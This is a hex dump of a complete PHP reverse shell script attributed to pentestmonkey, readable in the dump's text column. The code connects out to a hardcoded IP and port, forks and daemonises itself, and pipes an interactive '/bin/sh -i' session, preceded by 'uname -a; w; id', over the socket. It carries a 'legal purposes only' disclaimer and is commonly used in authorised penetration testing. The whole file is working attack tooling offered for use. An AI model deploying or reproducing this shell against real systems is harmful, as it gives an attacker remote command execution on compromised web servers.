00000000: 3c3f 7068 700a 2f2f 2070 6870 2d72 6576  <?php.// php-rev
00000010: 6572 7365 2d73 6865 6c6c 202d 2041 2052  erse-shell - A R
00000020: 6576 6572 7365 2053 6865 6c6c 2069 6d70  everse Shell imp
00000030: 6c65 6d65 6e74 6174 696f 6e20 696e 2050  lementation in P
00000040: 4850 0a2f 2f20 436f 7079 7269 6768 7420  HP.// Copyright 
00000050: 2843 2920 3230 3037 2070 656e 7465 7374  (C) 2007 pentest
00000060: 6d6f 6e6b 6579 4070 656e 7465 7374 6d6f  monkey@pentestmo
00000070: 6e6b 6579 2e6e 6574 0a2f 2f0a 2f2f 2054  nkey.net.//.// T
00000080: 6869 7320 746f 6f6c 206d 6179 2062 6520  his tool may be 
00000090: 7573 6564 2066 6f72 206c 6567 616c 2070  used for legal p
000000a0: 7572 706f 7365 7320 6f6e 6c79 2e20 2055  urposes only.  U
000000b0: 7365 7273 2074 616b 6520 6675 6c6c 2072  sers take full r
000000c0: 6573 706f 6e73 6962 696c 6974 790a 2f2f  esponsibility.//
000000d0: 2066 6f72 2061 6e79 2061 6374 696f 6e73   for any actions
000000e0: 2070 6572 666f 726d 6564 2075 7369 6e67   performed using
000000f0: 2074 6869 7320 746f 6f6c 2e20 2054 6865   this tool.  The
00000100: 2061 7574 686f 7220 6163 6365 7074 7320   author accepts 
00000110: 6e6f 206c 6961 6269 6c69 7479 0a2f 2f20  no liability.// 
00000120: 666f 7220 6461 6d61 6765 2063 6175 7365  for damage cause
00000130: 6420 6279 2074 6869 7320 746f 6f6c 2e20  d by this tool. 
00000140: 2049 6620 7468 6573 6520 7465 726d 7320   If these terms 
00000150: 6172 6520 6e6f 7420 6163 6365 7074 6162  are not acceptab
00000160: 6c65 2074 6f20 796f 752c 2074 6865 6e0a  le to you, then.
00000170: 2f2f 2064 6f20 6e6f 7420 7573 6520 7468  // do not use th
00000180: 6973 2074 6f6f 6c2e 0a2f 2f0a 2f2f 2049  is tool..//.// I
00000190: 6e20 616c 6c20 6f74 6865 7220 7265 7370  n all other resp
000001a0: 6563 7473 2074 6865 2047 504c 2076 6572  ects the GPL ver
000001b0: 7369 6f6e 2032 2061 7070 6c69 6573 3a0a  sion 2 applies:.
000001c0: 2f2f 0a2f 2f20 5468 6973 2070 726f 6772  //.// This progr
000001d0: 616d 2069 7320 6672 6565 2073 6f66 7477  am is free softw
000001e0: 6172 653b 2079 6f75 2063 616e 2072 6564  are; you can red
000001f0: 6973 7472 6962 7574 6520 6974 2061 6e64  istribute it and
00000200: 2f6f 7220 6d6f 6469 6679 0a2f 2f20 6974  /or modify.// it
00000210: 2075 6e64 6572 2074 6865 2074 6572 6d73   under the terms
00000220: 206f 6620 7468 6520 474e 5520 4765 6e65   of the GNU Gene
00000230: 7261 6c20 5075 626c 6963 204c 6963 656e  ral Public Licen
00000240: 7365 2076 6572 7369 6f6e 2032 2061 730a  se version 2 as.
00000250: 2f2f 2070 7562 6c69 7368 6564 2062 7920  // published by 
00000260: 7468 6520 4672 6565 2053 6f66 7477 6172  the Free Softwar
00000270: 6520 466f 756e 6461 7469 6f6e 2e0a 2f2f  e Foundation..//
00000280: 0a2f 2f20 5468 6973 2070 726f 6772 616d  .// This program
00000290: 2069 7320 6469 7374 7269 6275 7465 6420   is distributed 
000002a0: 696e 2074 6865 2068 6f70 6520 7468 6174  in the hope that
000002b0: 2069 7420 7769 6c6c 2062 6520 7573 6566   it will be usef
000002c0: 756c 2c0a 2f2f 2062 7574 2057 4954 484f  ul,.// but WITHO
000002d0: 5554 2041 4e59 2057 4152 5241 4e54 593b  UT ANY WARRANTY;
000002e0: 2077 6974 686f 7574 2065 7665 6e20 7468   without even th
000002f0: 6520 696d 706c 6965 6420 7761 7272 616e  e implied warran
00000300: 7479 206f 660a 2f2f 204d 4552 4348 414e  ty of.// MERCHAN
00000310: 5441 4249 4c49 5459 206f 7220 4649 544e  TABILITY or FITN
00000320: 4553 5320 464f 5220 4120 5041 5254 4943  ESS FOR A PARTIC
00000330: 554c 4152 2050 5552 504f 5345 2e20 2053  ULAR PURPOSE.  S
00000340: 6565 2074 6865 0a2f 2f20 474e 5520 4765  ee the.// GNU Ge
00000350: 6e65 7261 6c20 5075 626c 6963 204c 6963  neral Public Lic
00000360: 656e 7365 2066 6f72 206d 6f72 6520 6465  ense for more de
00000370: 7461 696c 732e 0a2f 2f0a 2f2f 2059 6f75  tails..//.// You
00000380: 2073 686f 756c 6420 6861 7665 2072 6563   should have rec
00000390: 6569 7665 6420 6120 636f 7079 206f 6620  eived a copy of 
000003a0: 7468 6520 474e 5520 4765 6e65 7261 6c20  the GNU General 
000003b0: 5075 626c 6963 204c 6963 656e 7365 2061  Public License a
000003c0: 6c6f 6e67 0a2f 2f20 7769 7468 2074 6869  long.// with thi
000003d0: 7320 7072 6f67 7261 6d3b 2069 6620 6e6f  s program; if no
000003e0: 742c 2077 7269 7465 2074 6f20 7468 6520  t, write to the 
000003f0: 4672 6565 2053 6f66 7477 6172 6520 466f  Free Software Fo
00000400: 756e 6461 7469 6f6e 2c20 496e 632e 2c0a  undation, Inc.,.
00000410: 2f2f 2035 3120 4672 616e 6b6c 696e 2053  // 51 Franklin S
00000420: 7472 6565 742c 2046 6966 7468 2046 6c6f  treet, Fifth Flo
00000430: 6f72 2c20 426f 7374 6f6e 2c20 4d41 2030  or, Boston, MA 0
00000440: 3231 3130 2d31 3330 3120 5553 412e 0a2f  2110-1301 USA../
00000450: 2f0a 2f2f 2054 6869 7320 746f 6f6c 206d  /.// This tool m
00000460: 6179 2062 6520 7573 6564 2066 6f72 206c  ay be used for l
00000470: 6567 616c 2070 7572 706f 7365 7320 6f6e  egal purposes on
00000480: 6c79 2e20 2055 7365 7273 2074 616b 6520  ly.  Users take 
00000490: 6675 6c6c 2072 6573 706f 6e73 6962 696c  full responsibil
000004a0: 6974 790a 2f2f 2066 6f72 2061 6e79 2061  ity.// for any a
000004b0: 6374 696f 6e73 2070 6572 666f 726d 6564  ctions performed
000004c0: 2075 7369 6e67 2074 6869 7320 746f 6f6c   using this tool
000004d0: 2e20 2049 6620 7468 6573 6520 7465 726d  .  If these term
000004e0: 7320 6172 6520 6e6f 7420 6163 6365 7074  s are not accept
000004f0: 6162 6c65 2074 6f0a 2f2f 2079 6f75 2c20  able to.// you, 
00000500: 7468 656e 2064 6f20 6e6f 7420 7573 6520  then do not use 
00000510: 7468 6973 2074 6f6f 6c2e 0a2f 2f0a 2f2f  this tool..//.//
00000520: 2059 6f75 2061 7265 2065 6e63 6f75 7261   You are encoura
00000530: 6765 6420 746f 2073 656e 6420 636f 6d6d  ged to send comm
00000540: 656e 7473 2c20 696d 7072 6f76 656d 656e  ents, improvemen
00000550: 7473 206f 7220 7375 6767 6573 7469 6f6e  ts or suggestion
00000560: 7320 746f 0a2f 2f20 6d65 2061 7420 7065  s to.// me at pe
00000570: 6e74 6573 746d 6f6e 6b65 7940 7065 6e74  ntestmonkey@pent
00000580: 6573 746d 6f6e 6b65 792e 6e65 740a 2f2f  estmonkey.net.//
00000590: 0a2f 2f20 4465 7363 7269 7074 696f 6e0a  .// Description.
000005a0: 2f2f 202d 2d2d 2d2d 2d2d 2d2d 2d2d 0a2f  // -----------./
000005b0: 2f20 5468 6973 2073 6372 6970 7420 7769  / This script wi
000005c0: 6c6c 206d 616b 6520 616e 206f 7574 626f  ll make an outbo
000005d0: 756e 6420 5443 5020 636f 6e6e 6563 7469  und TCP connecti
000005e0: 6f6e 2074 6f20 6120 6861 7264 636f 6465  on to a hardcode
000005f0: 6420 4950 2061 6e64 2070 6f72 742e 0a2f  d IP and port../
00000600: 2f20 5468 6520 7265 6369 7069 656e 7420  / The recipient 
00000610: 7769 6c6c 2062 6520 6769 7665 6e20 6120  will be given a 
00000620: 7368 656c 6c20 7275 6e6e 696e 6720 6173  shell running as
00000630: 2074 6865 2063 7572 7265 6e74 2075 7365   the current use
00000640: 7220 2861 7061 6368 6520 6e6f 726d 616c  r (apache normal
00000650: 6c79 292e 0a2f 2f0a 2f2f 204c 696d 6974  ly)..//.// Limit
00000660: 6174 696f 6e73 0a2f 2f20 2d2d 2d2d 2d2d  ations.// ------
00000670: 2d2d 2d2d 2d0a 2f2f 2070 726f 635f 6f70  -----.// proc_op
00000680: 656e 2061 6e64 2073 7472 6561 6d5f 7365  en and stream_se
00000690: 745f 626c 6f63 6b69 6e67 2072 6571 7569  t_blocking requi
000006a0: 7265 2050 4850 2076 6572 7369 6f6e 2034  re PHP version 4
000006b0: 2e33 2b2c 206f 7220 352b 0a2f 2f20 5573  .3+, or 5+.// Us
000006c0: 6520 6f66 2073 7472 6561 6d5f 7365 6c65  e of stream_sele
000006d0: 6374 2829 206f 6e20 6669 6c65 2064 6573  ct() on file des
000006e0: 6372 6970 746f 7273 2072 6574 7572 6e65  criptors returne
000006f0: 6420 6279 2070 726f 635f 6f70 656e 2829  d by proc_open()
00000700: 2077 696c 6c20 6661 696c 2061 6e64 2072   will fail and r
00000710: 6574 7572 6e20 4641 4c53 4520 756e 6465  eturn FALSE unde
00000720: 7220 5769 6e64 6f77 732e 0a2f 2f20 536f  r Windows..// So
00000730: 6d65 2063 6f6d 7069 6c65 2d74 696d 6520  me compile-time 
00000740: 6f70 7469 6f6e 7320 6172 6520 6e65 6564  options are need
00000750: 6564 2066 6f72 2064 6165 6d6f 6e69 7361  ed for daemonisa
00000760: 7469 6f6e 2028 6c69 6b65 2070 636e 746c  tion (like pcntl
00000770: 2c20 706f 7369 7829 2e20 2054 6865 7365  , posix).  These
00000780: 2061 7265 2072 6172 656c 7920 6176 6169   are rarely avai
00000790: 6c61 626c 652e 0a2f 2f0a 2f2f 2055 7361  lable..//.// Usa
000007a0: 6765 0a2f 2f20 2d2d 2d2d 2d0a 2f2f 2053  ge.// -----.// S
000007b0: 6565 2068 7474 703a 2f2f 7065 6e74 6573  ee http://pentes
000007c0: 746d 6f6e 6b65 792e 6e65 742f 746f 6f6c  tmonkey.net/tool
000007d0: 732f 7068 702d 7265 7665 7273 652d 7368  s/php-reverse-sh
000007e0: 656c 6c20 6966 2079 6f75 2067 6574 2073  ell if you get s
000007f0: 7475 636b 2e0a 0a73 6574 5f74 696d 655f  tuck...set_time_
00000800: 6c69 6d69 7420 2830 293b 0a24 5645 5253  limit (0);.$VERS
00000810: 494f 4e20 3d20 2231 2e30 223b 0a24 6970  ION = "1.0";.$ip
00000820: 203d 2027 3130 2e34 2e32 332e 3132 3027   = '10.4.23.120'
00000830: 3b20 202f 2f20 4348 414e 4745 2054 4849  ;  // CHANGE THI
00000840: 530a 2470 6f72 7420 3d20 3132 3334 3b20  S.$port = 1234; 
00000850: 2020 2020 2020 2f2f 2043 4841 4e47 4520        // CHANGE 
00000860: 5448 4953 0a24 6368 756e 6b5f 7369 7a65  THIS.$chunk_size
00000870: 203d 2031 3430 303b 0a24 7772 6974 655f   = 1400;.$write_
00000880: 6120 3d20 6e75 6c6c 3b0a 2465 7272 6f72  a = null;.$error
00000890: 5f61 203d 206e 756c 6c3b 0a24 7368 656c  _a = null;.$shel
000008a0: 6c20 3d20 2775 6e61 6d65 202d 613b 2077  l = 'uname -a; w
000008b0: 3b20 6964 3b20 2f62 696e 2f73 6820 2d69  ; id; /bin/sh -i
000008c0: 273b 0a24 6461 656d 6f6e 203d 2030 3b0a  ';.$daemon = 0;.
000008d0: 2464 6562 7567 203d 2030 3b0a 0a2f 2f0a  $debug = 0;..//.
000008e0: 2f2f 2044 6165 6d6f 6e69 7365 206f 7572  // Daemonise our
000008f0: 7365 6c66 2069 6620 706f 7373 6962 6c65  self if possible
00000900: 2074 6f20 6176 6f69 6420 7a6f 6d62 6965   to avoid zombie
00000910: 7320 6c61 7465 720a 2f2f 0a0a 2f2f 2070  s later.//..// p
00000920: 636e 746c 5f66 6f72 6b20 6973 2068 6172  cntl_fork is har
00000930: 646c 7920 6576 6572 2061 7661 696c 6162  dly ever availab
00000940: 6c65 2c20 6275 7420 7769 6c6c 2061 6c6c  le, but will all
00000950: 6f77 2075 7320 746f 2064 6165 6d6f 6e69  ow us to daemoni
00000960: 7365 0a2f 2f20 6f75 7220 7068 7020 7072  se.// our php pr
00000970: 6f63 6573 7320 616e 6420 6176 6f69 6420  ocess and avoid 
00000980: 7a6f 6d62 6965 732e 2020 576f 7274 6820  zombies.  Worth 
00000990: 6120 7472 792e 2e2e 0a69 6620 2866 756e  a try....if (fun
000009a0: 6374 696f 6e5f 6578 6973 7473 2827 7063  ction_exists('pc
000009b0: 6e74 6c5f 666f 726b 2729 2920 7b0a 092f  ntl_fork')) {../
000009c0: 2f20 466f 726b 2061 6e64 2068 6176 6520  / Fork and have 
000009d0: 7468 6520 7061 7265 6e74 2070 726f 6365  the parent proce
000009e0: 7373 2065 7869 740a 0924 7069 6420 3d20  ss exit..$pid = 
000009f0: 7063 6e74 6c5f 666f 726b 2829 3b0a 090a  pcntl_fork();...
00000a00: 0969 6620 2824 7069 6420 3d3d 202d 3129  .if ($pid == -1)
00000a10: 207b 0a09 0970 7269 6e74 6974 2822 4552   {...printit("ER
00000a20: 524f 523a 2043 616e 2774 2066 6f72 6b22  ROR: Can't fork"
00000a30: 293b 0a09 0965 7869 7428 3129 3b0a 097d  );...exit(1);..}
00000a40: 0a09 0a09 6966 2028 2470 6964 2920 7b0a  ....if ($pid) {.
00000a50: 0909 6578 6974 2830 293b 2020 2f2f 2050  ..exit(0);  // P
00000a60: 6172 656e 7420 6578 6974 730a 097d 0a0a  arent exits..}..
00000a70: 092f 2f20 4d61 6b65 2074 6865 2063 7572  .// Make the cur
00000a80: 7265 6e74 2070 726f 6365 7373 2061 2073  rent process a s
00000a90: 6573 7369 6f6e 206c 6561 6465 720a 092f  ession leader../
00000aa0: 2f20 5769 6c6c 206f 6e6c 7920 7375 6363  / Will only succ
00000ab0: 6565 6420 6966 2077 6520 666f 726b 6564  eed if we forked
00000ac0: 0a09 6966 2028 706f 7369 785f 7365 7473  ..if (posix_sets
00000ad0: 6964 2829 203d 3d20 2d31 2920 7b0a 0909  id() == -1) {...
00000ae0: 7072 696e 7469 7428 2245 7272 6f72 3a20  printit("Error: 
00000af0: 4361 6e27 7420 7365 7473 6964 2829 2229  Can't setsid()")
00000b00: 3b0a 0909 6578 6974 2831 293b 0a09 7d0a  ;...exit(1);..}.
00000b10: 0a09 2464 6165 6d6f 6e20 3d20 313b 0a7d  ..$daemon = 1;.}
00000b20: 2065 6c73 6520 7b0a 0970 7269 6e74 6974   else {..printit
00000b30: 2822 5741 524e 494e 473a 2046 6169 6c65  ("WARNING: Faile
00000b40: 6420 746f 2064 6165 6d6f 6e69 7365 2e20  d to daemonise. 
00000b50: 2054 6869 7320 6973 2071 7569 7465 2063   This is quite c
00000b60: 6f6d 6d6f 6e20 616e 6420 6e6f 7420 6661  ommon and not fa
00000b70: 7461 6c2e 2229 3b0a 7d0a 0a2f 2f20 4368  tal.");.}..// Ch
00000b80: 616e 6765 2074 6f20 6120 7361 6665 2064  ange to a safe d
00000b90: 6972 6563 746f 7279 0a63 6864 6972 2822  irectory.chdir("
00000ba0: 2f22 293b 0a0a 2f2f 2052 656d 6f76 6520  /");..// Remove 
00000bb0: 616e 7920 756d 6173 6b20 7765 2069 6e68  any umask we inh
00000bc0: 6572 6974 6564 0a75 6d61 736b 2830 293b  erited.umask(0);
00000bd0: 0a0a 2f2f 0a2f 2f20 446f 2074 6865 2072  ..//.// Do the r
00000be0: 6576 6572 7365 2073 6865 6c6c 2e2e 2e0a  everse shell....
00000bf0: 2f2f 0a0a 2f2f 204f 7065 6e20 7265 7665  //..// Open reve
00000c00: 7273 6520 636f 6e6e 6563 7469 6f6e 0a24  rse connection.$
00000c10: 736f 636b 203d 2066 736f 636b 6f70 656e  sock = fsockopen
00000c20: 2824 6970 2c20 2470 6f72 742c 2024 6572  ($ip, $port, $er
00000c30: 726e 6f2c 2024 6572 7273 7472 2c20 3330  rno, $errstr, 30
00000c40: 293b 0a69 6620 2821 2473 6f63 6b29 207b  );.if (!$sock) {
00000c50: 0a09 7072 696e 7469 7428 2224 6572 7273  ..printit("$errs
00000c60: 7472 2028 2465 7272 6e6f 2922 293b 0a09  tr ($errno)");..
00000c70: 6578 6974 2831 293b 0a7d 0a0a 2f2f 2053  exit(1);.}..// S
00000c80: 7061 776e 2073 6865 6c6c 2070 726f 6365  pawn shell proce
00000c90: 7373 0a24 6465 7363 7269 7074 6f72 7370  ss.$descriptorsp
00000ca0: 6563 203d 2061 7272 6179 280a 2020 2030  ec = array(.   0
00000cb0: 203d 3e20 6172 7261 7928 2270 6970 6522   => array("pipe"
00000cc0: 2c20 2272 2229 2c20 202f 2f20 7374 6469  , "r"),  // stdi
00000cd0: 6e20 6973 2061 2070 6970 6520 7468 6174  n is a pipe that
00000ce0: 2074 6865 2063 6869 6c64 2077 696c 6c20   the child will 
00000cf0: 7265 6164 2066 726f 6d0a 2020 2031 203d  read from.   1 =
00000d00: 3e20 6172 7261 7928 2270 6970 6522 2c20  > array("pipe", 
00000d10: 2277 2229 2c20 202f 2f20 7374 646f 7574  "w"),  // stdout
00000d20: 2069 7320 6120 7069 7065 2074 6861 7420   is a pipe that 
00000d30: 7468 6520 6368 696c 6420 7769 6c6c 2077  the child will w
00000d40: 7269 7465 2074 6f0a 2020 2032 203d 3e20  rite to.   2 => 
00000d50: 6172 7261 7928 2270 6970 6522 2c20 2277  array("pipe", "w
00000d60: 2229 2020 202f 2f20 7374 6465 7272 2069  ")   // stderr i
00000d70: 7320 6120 7069 7065 2074 6861 7420 7468  s a pipe that th
00000d80: 6520 6368 696c 6420 7769 6c6c 2077 7269  e child will wri
00000d90: 7465 2074 6f0a 293b 0a0a 2470 726f 6365  te to.);..$proce
00000da0: 7373 203d 2070 726f 635f 6f70 656e 2824  ss = proc_open($
00000db0: 7368 656c 6c2c 2024 6465 7363 7269 7074  shell, $descript
00000dc0: 6f72 7370 6563 2c20 2470 6970 6573 293b  orspec, $pipes);
00000dd0: 0a0a 6966 2028 2169 735f 7265 736f 7572  ..if (!is_resour
00000de0: 6365 2824 7072 6f63 6573 7329 2920 7b0a  ce($process)) {.
00000df0: 0970 7269 6e74 6974 2822 4552 524f 523a  .printit("ERROR:
00000e00: 2043 616e 2774 2073 7061 776e 2073 6865   Can't spawn she
00000e10: 6c6c 2229 3b0a 0965 7869 7428 3129 3b0a  ll");..exit(1);.
00000e20: 7d0a 0a2f 2f20 5365 7420 6576 6572 7974  }..// Set everyt
00000e30: 6869 6e67 2074 6f20 6e6f 6e2d 626c 6f63  hing to non-bloc
00000e40: 6b69 6e67 0a2f 2f20 5265 6173 6f6e 3a20  king.// Reason: 
00000e50: 4f63 6373 696f 6e61 6c6c 7920 7265 6164  Occsionally read
00000e60: 7320 7769 6c6c 2062 6c6f 636b 2c20 6576  s will block, ev
00000e70: 656e 2074 686f 7567 6820 7374 7265 616d  en though stream
00000e80: 5f73 656c 6563 7420 7465 6c6c 7320 7573  _select tells us
00000e90: 2074 6865 7920 776f 6e27 740a 7374 7265   they won't.stre
00000ea0: 616d 5f73 6574 5f62 6c6f 636b 696e 6728  am_set_blocking(
00000eb0: 2470 6970 6573 5b30 5d2c 2030 293b 0a73  $pipes[0], 0);.s
00000ec0: 7472 6561 6d5f 7365 745f 626c 6f63 6b69  tream_set_blocki
00000ed0: 6e67 2824 7069 7065 735b 315d 2c20 3029  ng($pipes[1], 0)
00000ee0: 3b0a 7374 7265 616d 5f73 6574 5f62 6c6f  ;.stream_set_blo
00000ef0: 636b 696e 6728 2470 6970 6573 5b32 5d2c  cking($pipes[2],
00000f00: 2030 293b 0a73 7472 6561 6d5f 7365 745f   0);.stream_set_
00000f10: 626c 6f63 6b69 6e67 2824 736f 636b 2c20  blocking($sock, 
00000f20: 3029 3b0a 0a70 7269 6e74 6974 2822 5375  0);..printit("Su
00000f30: 6363 6573 7366 756c 6c79 206f 7065 6e65  ccessfully opene
00000f40: 6420 7265 7665 7273 6520 7368 656c 6c20  d reverse shell 
00000f50: 746f 2024 6970 3a24 706f 7274 2229 3b0a  to $ip:$port");.
00000f60: 0a77 6869 6c65 2028 3129 207b 0a09 2f2f  .while (1) {..//
00000f70: 2043 6865 636b 2066 6f72 2065 6e64 206f   Check for end o
00000f80: 6620 5443 5020 636f 6e6e 6563 7469 6f6e  f TCP connection
00000f90: 0a09 6966 2028 6665 6f66 2824 736f 636b  ..if (feof($sock
00000fa0: 2929 207b 0a09 0970 7269 6e74 6974 2822  )) {...printit("
00000fb0: 4552 524f 523a 2053 6865 6c6c 2063 6f6e  ERROR: Shell con
00000fc0: 6e65 6374 696f 6e20 7465 726d 696e 6174  nection terminat
00000fd0: 6564 2229 3b0a 0909 6272 6561 6b3b 0a09  ed");...break;..
00000fe0: 7d0a 0a09 2f2f 2043 6865 636b 2066 6f72  }...// Check for
00000ff0: 2065 6e64 206f 6620 5354 444f 5554 0a09   end of STDOUT..
00001000: 6966 2028 6665 6f66 2824 7069 7065 735b  if (feof($pipes[
00001010: 315d 2929 207b 0a09 0970 7269 6e74 6974  1])) {...printit
00001020: 2822 4552 524f 523a 2053 6865 6c6c 2070  ("ERROR: Shell p
00001030: 726f 6365 7373 2074 6572 6d69 6e61 7465  rocess terminate
00001040: 6422 293b 0a09 0962 7265 616b 3b0a 097d  d");...break;..}
00001050: 0a0a 092f 2f20 5761 6974 2075 6e74 696c  ...// Wait until
00001060: 2061 2063 6f6d 6d61 6e64 2069 7320 656e   a command is en
00001070: 6420 646f 776e 2024 736f 636b 2c20 6f72  d down $sock, or
00001080: 2073 6f6d 650a 092f 2f20 636f 6d6d 616e   some..// comman
00001090: 6420 6f75 7470 7574 2069 7320 6176 6169  d output is avai
000010a0: 6c61 626c 6520 6f6e 2053 5444 4f55 5420  lable on STDOUT 
000010b0: 6f72 2053 5444 4552 520a 0924 7265 6164  or STDERR..$read
000010c0: 5f61 203d 2061 7272 6179 2824 736f 636b  _a = array($sock
000010d0: 2c20 2470 6970 6573 5b31 5d2c 2024 7069  , $pipes[1], $pi
000010e0: 7065 735b 325d 293b 0a09 246e 756d 5f63  pes[2]);..$num_c
000010f0: 6861 6e67 6564 5f73 6f63 6b65 7473 203d  hanged_sockets =
00001100: 2073 7472 6561 6d5f 7365 6c65 6374 2824   stream_select($
00001110: 7265 6164 5f61 2c20 2477 7269 7465 5f61  read_a, $write_a
00001120: 2c20 2465 7272 6f72 5f61 2c20 6e75 6c6c  , $error_a, null
00001130: 293b 0a0a 092f 2f20 4966 2077 6520 6361  );...// If we ca
00001140: 6e20 7265 6164 2066 726f 6d20 7468 6520  n read from the 
00001150: 5443 5020 736f 636b 6574 2c20 7365 6e64  TCP socket, send
00001160: 0a09 2f2f 2064 6174 6120 746f 2070 726f  ..// data to pro
00001170: 6365 7373 2773 2053 5444 494e 0a09 6966  cess's STDIN..if
00001180: 2028 696e 5f61 7272 6179 2824 736f 636b   (in_array($sock
00001190: 2c20 2472 6561 645f 6129 2920 7b0a 0909  , $read_a)) {...
000011a0: 6966 2028 2464 6562 7567 2920 7072 696e  if ($debug) prin
000011b0: 7469 7428 2253 4f43 4b20 5245 4144 2229  tit("SOCK READ")
000011c0: 3b0a 0909 2469 6e70 7574 203d 2066 7265  ;...$input = fre
000011d0: 6164 2824 736f 636b 2c20 2463 6875 6e6b  ad($sock, $chunk
000011e0: 5f73 697a 6529 3b0a 0909 6966 2028 2464  _size);...if ($d
000011f0: 6562 7567 2920 7072 696e 7469 7428 2253  ebug) printit("S
00001200: 4f43 4b3a 2024 696e 7075 7422 293b 0a09  OCK: $input");..
00001210: 0966 7772 6974 6528 2470 6970 6573 5b30  .fwrite($pipes[0
00001220: 5d2c 2024 696e 7075 7429 3b0a 097d 0a0a  ], $input);..}..
00001230: 092f 2f20 4966 2077 6520 6361 6e20 7265  .// If we can re
00001240: 6164 2066 726f 6d20 7468 6520 7072 6f63  ad from the proc
00001250: 6573 7327 7320 5354 444f 5554 0a09 2f2f  ess's STDOUT..//
00001260: 2073 656e 6420 6461 7461 2064 6f77 6e20   send data down 
00001270: 7463 7020 636f 6e6e 6563 7469 6f6e 0a09  tcp connection..
00001280: 6966 2028 696e 5f61 7272 6179 2824 7069  if (in_array($pi
00001290: 7065 735b 315d 2c20 2472 6561 645f 6129  pes[1], $read_a)
000012a0: 2920 7b0a 0909 6966 2028 2464 6562 7567  ) {...if ($debug
000012b0: 2920 7072 696e 7469 7428 2253 5444 4f55  ) printit("STDOU
000012c0: 5420 5245 4144 2229 3b0a 0909 2469 6e70  T READ");...$inp
000012d0: 7574 203d 2066 7265 6164 2824 7069 7065  ut = fread($pipe
000012e0: 735b 315d 2c20 2463 6875 6e6b 5f73 697a  s[1], $chunk_siz
000012f0: 6529 3b0a 0909 6966 2028 2464 6562 7567  e);...if ($debug
00001300: 2920 7072 696e 7469 7428 2253 5444 4f55  ) printit("STDOU
00001310: 543a 2024 696e 7075 7422 293b 0a09 0966  T: $input");...f
00001320: 7772 6974 6528 2473 6f63 6b2c 2024 696e  write($sock, $in
00001330: 7075 7429 3b0a 097d 0a0a 092f 2f20 4966  put);..}...// If
00001340: 2077 6520 6361 6e20 7265 6164 2066 726f   we can read fro
00001350: 6d20 7468 6520 7072 6f63 6573 7327 7320  m the process's 
00001360: 5354 4445 5252 0a09 2f2f 2073 656e 6420  STDERR..// send 
00001370: 6461 7461 2064 6f77 6e20 7463 7020 636f  data down tcp co
00001380: 6e6e 6563 7469 6f6e 0a09 6966 2028 696e  nnection..if (in
00001390: 5f61 7272 6179 2824 7069 7065 735b 325d  _array($pipes[2]
000013a0: 2c20 2472 6561 645f 6129 2920 7b0a 0909  , $read_a)) {...
000013b0: 6966 2028 2464 6562 7567 2920 7072 696e  if ($debug) prin
000013c0: 7469 7428 2253 5444 4552 5220 5245 4144  tit("STDERR READ
000013d0: 2229 3b0a 0909 2469 6e70 7574 203d 2066  ");...$input = f
000013e0: 7265 6164 2824 7069 7065 735b 325d 2c20  read($pipes[2], 
000013f0: 2463 6875 6e6b 5f73 697a 6529 3b0a 0909  $chunk_size);...
00001400: 6966 2028 2464 6562 7567 2920 7072 696e  if ($debug) prin
00001410: 7469 7428 2253 5444 4552 523a 2024 696e  tit("STDERR: $in
00001420: 7075 7422 293b 0a09 0966 7772 6974 6528  put");...fwrite(
00001430: 2473 6f63 6b2c 2024 696e 7075 7429 3b0a  $sock, $input);.
00001440: 097d 0a7d 0a0a 6663 6c6f 7365 2824 736f  .}.}..fclose($so
00001450: 636b 293b 0a66 636c 6f73 6528 2470 6970  ck);.fclose($pip
00001460: 6573 5b30 5d29 3b0a 6663 6c6f 7365 2824  es[0]);.fclose($
00001470: 7069 7065 735b 315d 293b 0a66 636c 6f73  pipes[1]);.fclos
00001480: 6528 2470 6970 6573 5b32 5d29 3b0a 7072  e($pipes[2]);.pr
00001490: 6f63 5f63 6c6f 7365 2824 7072 6f63 6573  oc_close($proces
000014a0: 7329 3b0a 0a2f 2f20 4c69 6b65 2070 7269  s);..// Like pri
000014b0: 6e74 2c20 6275 7420 646f 6573 206e 6f74  nt, but does not
000014c0: 6869 6e67 2069 6620 7765 2776 6520 6461  hing if we've da
000014d0: 656d 6f6e 6973 6564 206f 7572 7365 6c66  emonised ourself
000014e0: 0a2f 2f20 2849 2063 616e 2774 2066 6967  .// (I can't fig
000014f0: 7572 6520 6f75 7420 686f 7720 746f 2072  ure out how to r
00001500: 6564 6972 6563 7420 5354 444f 5554 206c  edirect STDOUT l
00001510: 696b 6520 6120 7072 6f70 6572 2064 6165  ike a proper dae
00001520: 6d6f 6e29 0a66 756e 6374 696f 6e20 7072  mon).function pr
00001530: 696e 7469 7420 2824 7374 7269 6e67 2920  intit ($string) 
00001540: 7b0a 0969 6620 2821 2464 6165 6d6f 6e29  {..if (!$daemon)
00001550: 207b 0a09 0970 7269 6e74 2022 2473 7472   {...print "$str
00001560: 696e 675c 6e22 3b0a 097d 0a7d 0a0a 3f3e  ing\n";..}.}..?>
00001570: 200a 0a0a 0a                              ....
